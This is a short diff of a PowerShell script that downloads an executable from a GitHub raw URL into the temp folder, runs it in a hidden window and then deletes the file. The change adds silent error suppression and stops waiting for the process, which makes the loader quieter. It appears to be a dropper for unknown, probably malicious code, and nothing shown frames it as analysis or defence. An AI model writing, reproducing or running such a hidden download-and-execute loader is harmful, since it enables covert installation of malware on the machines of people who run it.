@@ -1,5 +1,5 @@
 $rand = Get-Random
 $path = "$env:TEMP\main_$rand.exe"
-Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path
-Start-Process $path -WindowStyle Hidden -Wait
+Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
+Start-Process $path -WindowStyle Hidden
 Remove-Item $path -Force
